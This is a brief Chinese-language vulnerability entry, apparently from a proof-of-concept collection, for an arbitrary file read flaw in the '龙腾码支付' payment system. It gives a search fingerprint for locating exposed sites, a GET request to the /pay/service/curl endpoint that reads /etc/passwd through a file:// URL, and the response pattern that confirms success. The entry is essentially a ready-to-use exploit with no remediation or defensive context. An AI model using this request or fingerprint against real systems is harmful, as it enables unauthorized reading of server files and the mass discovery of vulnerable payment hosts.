# 龙腾码支付curl存在任意文件读取漏洞

龙腾码支付 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/epaydoc/epaydoc.php"`
- **请求**：`GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1`
- **响应特征**：200 root: